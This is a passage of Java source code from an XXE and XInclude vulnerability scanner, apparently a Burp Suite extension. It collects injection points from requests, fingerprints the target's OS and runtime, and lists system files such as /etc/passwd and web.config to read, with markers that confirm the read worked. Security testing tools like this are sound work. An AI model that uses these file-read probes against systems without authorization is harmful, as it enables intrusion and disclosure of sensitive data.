                xml.append("<").append(safeKey).append(">")
                        .append(textValue)
                        .append("</").append(safeKey).append(">");
            }

            xml.append("</root>");
            return xml.toString();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Escapes special XML characters in text content.
     */
    private String xmlEscape(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&apos;");
    }

    /**
     * Extracts parameter injection targets from the request for XInclude testing.
     */
    private List<XxeTarget> extractParameterTargets(HttpRequest request) {
        List<XxeTarget> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new XxeTarget(param.name(), param.value(), XxeTargetType.COOKIE));
                    break;
            }
        }

        // Header injection targets for XInclude
        String[] headerTargets = {"User-Agent", "Referer", "SOAPAction", "Content-Type", "X-Forwarded-For"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new XxeTarget(headerName, h.value(), XxeTargetType.HEADER));
                    break;
                }
            }
        }

        // JSON body parameters (with recursive nested JSON traversal)
        String ct = getContentType(request);
        if (ct != null && ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonTargetsRecursive(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        return targets;
    }

    /**
     * Recursively extracts JSON key-value pairs as XInclude injection targets.
     * Uses dot-notation for nested keys (e.g., "user.profile.name").
     * Only extracts leaf-level string and numeric primitive values.
     */
    private void extractJsonTargetsRecursive(com.google.gson.JsonObject obj, String prefix, List<XxeTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive()) {
                if (val.getAsJsonPrimitive().isString()) {
                    targets.add(new XxeTarget(fullKey, val.getAsString(), XxeTargetType.JSON));
                } else if (val.getAsJsonPrimitive().isNumber()) {
                    targets.add(new XxeTarget(fullKey, val.getAsString(), XxeTargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonTargetsRecursive(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    /**
     * Retrieves the Content-Type header value from the request.
     */
    private String getContentType(HttpRequest request) {
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                return h.value().toLowerCase();
            }
        }
        return null;
    }

    /**
     * Checks whether a content type string indicates XML.
     */
    private boolean isXmlContentType(String contentType) {
        if (contentType == null) return false;
        String ct = contentType.toLowerCase();
        for (String xmlCt : XML_CONTENT_TYPES) {
            if (ct.contains(xmlCt)) return true;
        }
        return false;
    }

    /**
     * Finds new content in the response that was not present in the baseline.
     * Returns a trimmed string of the new content, or null if no significant difference.
     */
    private String findNewContent(String baseline, String response) {
        if (response == null || baseline == null) return null;
        // Simple heuristic: if the response is longer and contains content not in baseline
        if (response.length() <= baseline.length()) return null;

        // Extract portions of the response not found in the baseline
        // Use a simple line-by-line diff approach
        Set<String> baselineLines = new HashSet<>(Arrays.asList(baseline.split("\\n")));
        StringBuilder newContent = new StringBuilder();
        for (String line : response.split("\\n")) {
            String trimmed = line.trim();
            if (!trimmed.isEmpty() && !baselineLines.contains(line)) {
                if (newContent.length() > 0) newContent.append("\n");
                newContent.append(trimmed);
            }
        }
        String result = newContent.toString().trim();
        return result.isEmpty() ? null : result;
    }

    /**
     * Extracts the URL path (without query string) from a full URL.
     */
    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) {
                int q = url.indexOf('?', s);
                return q >= 0 ? url.substring(s, q) : url.substring(s);
            }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Delay between requests to the same host to avoid overwhelming the target.
     */
    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("xxe.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    // ==================== TARGET FINGERPRINTING ====================

    /** Minimal probe targets for unknown OS — only files with strong evidence patterns. */
    private static final String[][] PROBE_LINUX_TARGETS = {
            {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
            {"/proc/version", "Linux version", "/proc/version"},
            {"/etc/os-release", "NAME=", "/etc/os-release"},
    };

    private static final String[][] PROBE_WINDOWS_TARGETS = {
            {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
            {"C:/boot.ini", "[boot loader]", "C:\\boot.ini"},
            {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
    };

    /**
     * Inspects response headers and body to determine the target's OS and runtime.
     * Reduces irrelevant requests and false positives by tailoring payloads.
     */
    private TargetFingerprint fingerprint(HttpRequestResponse requestResponse) {
        HttpResponse response = requestResponse.response();
        if (response == null) return new TargetFingerprint(DetectedOS.UNKNOWN, DetectedRuntime.UNKNOWN);

        DetectedOS os = DetectedOS.UNKNOWN;
        DetectedRuntime runtime = DetectedRuntime.UNKNOWN;

        for (var h : response.headers()) {
            String name = h.name().toLowerCase();
            String value = h.value().toLowerCase();

            if (name.equals("server")) {
                if (value.contains("microsoft") || value.contains("iis")) {
                    os = DetectedOS.WINDOWS;
                } else if (value.contains("apache") || value.contains("nginx")
                        || value.contains("ubuntu") || value.contains("debian")
                        || value.contains("centos") || value.contains("unix")) {
                    os = DetectedOS.LINUX;
                }
                if (value.contains("tomcat") || value.contains("jetty") || value.contains("jboss")
                        || value.contains("wildfly") || value.contains("weblogic")
                        || value.contains("websphere") || value.contains("glassfish")) {
                    runtime = DetectedRuntime.JAVA;
                }
            }

            if (name.equals("x-powered-by")) {
                if (value.contains("php")) {
                    runtime = DetectedRuntime.PHP;
                    if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
                } else if (value.contains("asp.net")) {
                    runtime = DetectedRuntime.DOTNET;
                    os = DetectedOS.WINDOWS;
                } else if (value.contains("express") || value.contains("node")) {
                    runtime = DetectedRuntime.NODEJS;
                } else if (value.contains("servlet")) {
                    runtime = DetectedRuntime.JAVA;
                }
            }

            if (name.equals("x-aspnet-version") || name.equals("x-aspnetmvc-version")) {
                runtime = DetectedRuntime.DOTNET;
                os = DetectedOS.WINDOWS;
            }
        }

        // Fallback: check response body for technology indicators
        if (runtime == DetectedRuntime.UNKNOWN) {
            try {
                String body = response.bodyToString();
                if (body != null) {
                    String lower = body.toLowerCase();
                    if (lower.contains("javax.") || lower.contains("java.lang.")
                            || lower.contains("springframework") || lower.contains("at org.apache.")) {
                        runtime = DetectedRuntime.JAVA;
                    } else if (lower.contains("__viewstate") || lower.contains("asp.net")
                            || lower.contains("system.web")) {
                        runtime = DetectedRuntime.DOTNET;
                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.WINDOWS;
                    } else if (lower.contains("php warning") || lower.contains("php error")
                            || lower.contains("php fatal") || lower.contains("simplexml")) {
                        runtime = DetectedRuntime.PHP;
                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
                    }
                }
            } catch (Exception ignored) {}
        }

        return new TargetFingerprint(os, runtime);
    }

    /**
     * Returns Linux file targets filtered by fingerprint.
     * Known Windows → empty. Known Linux → full set. Unknown → minimal probes.
     */
    private String[][] getLinuxTargets(TargetFingerprint fp) {
        return switch (fp.os) {
            case WINDOWS -> new String[0][];
            case LINUX -> LINUX_FILE_TARGETS;
            case UNKNOWN -> PROBE_LINUX_TARGETS;
        };
    }

    /**
     * Returns Windows file targets filtered by fingerprint.
     * Known Linux → empty. Known Windows → full set. Unknown → minimal probes.
     */
    private String[][] getWindowsTargets(TargetFingerprint fp) {
        return switch (fp.os) {
            case LINUX -> new String[0][];
            case WINDOWS -> WINDOWS_FILE_TARGETS;
            case UNKNOWN -> PROBE_WINDOWS_TARGETS;
        };
    }

    /**
     * Checks if the endpoint reflects XML content back in the response.
     * If not, the endpoint is "blind" — OOB payloads should be prioritized
     * and classic file read skipped (it would only produce false positives).
     */
    private boolean isBlindEndpoint(HttpRequestResponse original, String requestBody) {
        String probe = "OMNISTRIKE_XXE_REFLECT_" + (System.currentTimeMillis() % 100000);
        String probeBody = injectEntityReferenceIntoFirstElement(requestBody, probe);
        HttpRequestResponse probeResult = sendRawRequest(original, probeBody);
        if (probeResult == null || probeResult.response() == null) return true;
        String responseBody = probeResult.response().bodyToString();
        return responseBody == null || !responseBody.contains(probe);
    }

    @Override
    public void destroy() { }

    // ==================== INNER TYPES ====================

    private enum DetectedOS { LINUX, WINDOWS, UNKNOWN }
    private enum DetectedRuntime { JAVA, DOTNET, PHP, PYTHON, RUBY, NODEJS, UNKNOWN }

    private static class TargetFingerprint {
        final DetectedOS os;
        final DetectedRuntime runtime;
        TargetFingerprint(DetectedOS os, DetectedRuntime runtime) {
            this.os = os;
            this.runtime = runtime;
        }
    }

    private enum XxeTargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class XxeTarget {
        final String name;
        final String originalValue;
        final XxeTargetType type;

        XxeTarget(String n, String v, XxeTargetType t) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
        }
    }

}
